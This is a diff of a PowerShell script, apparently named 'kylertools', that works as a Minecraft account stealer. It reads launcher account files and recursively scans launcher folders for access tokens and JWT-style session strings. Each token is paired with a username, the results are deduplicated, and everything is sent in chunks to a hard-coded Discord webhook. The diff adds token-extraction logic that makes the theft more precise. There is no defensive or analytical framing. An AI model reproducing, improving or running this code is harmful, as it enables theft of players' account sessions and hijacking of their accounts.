@@ -1,12 +1,13 @@
 $webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit"
 $h = @{ "Content-Type" = "application/json" }
 
-# test ping so u know it fired
+# test ping
 try{
     $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
     iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 10 -EA 0 | Out-Null
 }catch{}
 
+# known token file paths
 $paths = @(
     "$env:APPDATA\.minecraft\launcher_accounts.json",
     "$env:APPDATA\.minecraft\launcher_profiles.json",
@@ -21,7 +22,6 @@ $paths = @(
     "$env:APPDATA\PrismLauncher\accounts.json",
     "$env:APPDATA\MultiMC\accounts.json",
     "$env:APPDATA\PollyMC\accounts.json",
-    "$env:APPDATA\gdlauncher_carbon\data\gdl_conf.db",
     "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
     "$env:APPDATA\ModrinthApp\launcher_accounts.json",
     "$env:APPDATA\ModrinthApp\launcher_profiles.json",
@@ -34,16 +34,40 @@ $paths = @(
 
 $found = @()
 
+# scan known paths
 foreach($p in $paths){
     if(Test-Path $p){
         try{
-            $j = Get-Content $p -Raw
-            $found += "=== $p ===`n$j`n"
+            $raw = Get-Content $p -Raw
+            $j = $raw | ConvertFrom-Json -EA 0
+            $tok = $null
+            $uname = $null
+            if($j.accounts){
+                $j.accounts.PSObject.Properties | %{
+                    $a = $_.Value
+                    if($a.accessToken){
+                        $tok = $a.accessToken
+                        $uname = $a.minecraftProfile.name
+                    }
+                    elseif($a.minecraftProfile.accessToken){
+                        $tok = $a.minecraftProfile.accessToken
+                        $uname = $a.minecraftProfile.name
+                    }
+                }
+            }
+            if(-not $tok){
+                $m = [regex]::Match($raw, "eyJhbGciOi[A-Za-z0-9_\-\.]+")
+                if($m.Success){ $tok = $m.Value }
+            }
+            if($tok){
+                $label = if($uname){ $uname } else { "unknown" }
+                $found += "user: $label`nssid: $tok`nfile: $p`n"
+            }
         }catch{}
     }
 }
 
-# targeted subfolder scan instead of all appdata
+# deep scan launcher folders
 $roots = @(
     "$env:APPDATA\.minecraft",
     "$env:APPDATA\.lunarclient",
@@ -61,16 +85,31 @@ foreach($r in $roots){
             Get-ChildItem $r -Recurse -File -Include "*.json" -EA 0 | %{
                 if($_.Length -gt 1mb){ return }
                 $c = Get-Content $_.FullName -Raw -EA 0
-                if($c -match "accessToken|refreshToken|eyJhbGciOi"){
-                    $found += "=== $($_.FullName) ===`n$c`n"
+                $m = [regex]::Match($c, "eyJhbGciOi[A-Za-z0-9_\-\.]+")
+                if($m.Success){
+                    $found += "user: unknown`nssid: $($m.Value)`nfile: $($_.FullName)`n"
                 }
             }
         }catch{}
     }
 }
 
-# dedupe
-$found = $found | Select-Object -Unique
+# dedupe by ssid
+$seen = @{}
+$clean = @()
+foreach($f in $found){
+    $m = [regex]::Match($f, "ssid:\s*(\S+)")
+    if($m.Success){
+        $t = $m.Groups[1].Value
+        if(-not $seen.ContainsKey($t)){
+            $seen[$t] = $true
+            $clean += $f
+        }
+    } else {
+        $clean += $f
+    }
+}
+$found = $clean
 
 if($found.Count -eq 0){
     $found = "nothin found bro"
@@ -78,6 +117,7 @@ if($found.Count -eq 0){
 
 $joined = $found -join "`n"
 
+# chunk to fit webhook limit
 $limit = 1800
 $chunks = @()
 for($i = 0; $i -lt $joined.Length; $i += $limit){
@@ -95,6 +135,8 @@ foreach($c in $chunks){
         timestamp = (Get-Date).ToString("o")
     }
     $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
-    try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 10 -EA 0 | Out-Null }catch{}
+    try{
+        iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 10 -EA 0 | Out-Null
+    }catch{}
     Start-Sleep -Milliseconds 900
 }
